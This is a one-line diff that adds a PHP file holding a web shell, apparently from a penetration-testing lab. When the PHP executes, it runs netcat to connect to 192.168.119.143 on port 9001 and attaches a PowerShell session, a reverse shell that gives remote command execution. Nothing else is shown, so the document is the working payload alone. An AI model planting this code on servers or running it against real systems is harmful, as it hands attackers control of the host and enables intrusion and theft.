@@ -1,0 +1,1 @@
+<?php system('nc.exe 192.168.119.143 9001 -e powershell');?>
